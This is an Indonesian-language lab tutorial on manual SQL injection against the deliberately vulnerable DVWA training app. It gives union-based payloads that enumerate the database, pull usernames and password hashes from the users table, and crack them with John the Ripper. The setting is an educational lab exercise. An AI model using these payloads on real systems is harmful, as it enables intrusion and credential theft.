# Lesson 6 - Manual SQL Injection, John the Ripper


## Set DVWA dengan low Security

1. Login pada dvwa
	* username: admin
	* password: password
2. Lalu set Security menjadi low
	* klik "DVWA security"
	* set menjadi *low*

![1 set fedora low](https://user-images.githubusercontent.com/17487644/34214252-7e60bd60-e5d4-11e7-98bf-1cef8db4e81f.png)

## Manual SQL injection
1. pilih "sql injection" pada sidebar
2. Coba mengecek data user dengan menggunakan user id

![1 test the user_id](https://user-images.githubusercontent.com/17487644/34215884-5495172e-e5d9-11e7-8cd3-4e85c3bd1620.png)

3. untuk menampilkan data semua user, masukan command:
	1.  %' or '0'='0
	2. lalu klik submit

![2 show all](https://user-images.githubusercontent.com/17487644/34215885-54cb5366-e5d9-11e7-9bcf-d20b66d0b5aa.png)

4. untuk menampilkan versi db, masukan command:
	1. %' or 0=0 union select null, version() #
	2. lalu klik submit
	* versi db akan keluar pada baris terakhir

![3 versi db](https://user-images.githubusercontent.com/17487644/34215886-55048c44-e5d9-11e7-8c75-ab1509759028.png)

5. untuk menampilkan user db, masukan command:
	1. %' or 0=0 union select null, user() #
	2. lalu klik submit
	* user db yang sedang mengakses akan ditampilkan di baris terakhir

![4 user db](https://user-images.githubusercontent.com/17487644/34215887-55474b9c-e5d9-11e7-83db-4ef89518a7e5.png)

6. menampilkan nama db, masukan command:
	1. %' or 0=0 union select null, database() #
	2. lalu klik submit
	* nama db yang digunakan akan tamil di baris terakhir

![5 nama db](https://user-images.githubusercontent.com/17487644/34215889-557e6f6e-e5d9-11e7-8fab-f48b56838131.png)

7. menampilkan information_schema, masukan command:
	1. %' and 1=0 union select null, table_name from information_schema.tables #
	2. klik submit
	* nama-nama tabel pada db information_schema akan ditampilkan pada tiap baris

![6 information schema](https://user-images.githubusercontent.com/17487644/34215890-55b53738-e5d9-11e7-9c37-260d061e8761.png)

8. menampilkan semua tabel user di db information_schema, masukan command:
	1. %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
	2. klik submit
	* nama-nama tabel user akan ditampilkan tiap baris, tabel-tabel ini berisi password

![7 tabel contain password](https://user-images.githubusercontent.com/17487644/34215891-55f0a188-e5d9-11e7-938f-35d050968154.png)

9. menampilkan kolom-kolom pada tabel user, masukan command:
	1. %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
	2. klik submit

![8 column of users](https://user-images.githubusercontent.com/17487644/34215892-562744f4-e5d9-11e7-81ca-8ebfc9d0a4b3.png)

10. menampilkan semua isi dari tabel user menggunakan nama kolom, masukan command:
	1. %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
	2. klik submit

![9 row tiap kolom username dan password](https://user-images.githubusercontent.com/17487644/34215894-565e5c50-e5d9-11e7-9820-2b6ada6a938a.png)
]

11. Membuat file notepad berisi password
	1. copy semua username dan password
	2. buka notepad

![10 open notepad](https://user-images.githubusercontent.com/17487644/34215895-56976f54-e5d9-11e7-8ec0-cf7188c543a0.png)

	3. lalu paste tiap-tiap username dan password
	4. lalu buat sehingga seperti pada gambar

![11 daftar nama password notepad](https://user-images.githubusercontent.com/17487644/34215897-56cea8b6-e5d9-11e7-8580-edb049d734e9.png)
	
	5. lalu simpan di folder "/pentest/passwords/john", dengan nama "dvwa_password.txt"

![12 save password-john](https://user-images.githubusercontent.com/17487644/34215898-5704d814-e5d9-11e7-8f20-02aa962205f7.png)


## Bukti Selesai Lesson 6
1. Buka terminal baru
2. cd /pentest/passwords/john
3. ./john --format=raw-MD5 dvwa_password.txt

![13 hasil - dapet password dvwa](https://user-images.githubusercontent.com/17487644/34215883-545e0022-e5d9-11e7-82fe-f4f59eb14453.png)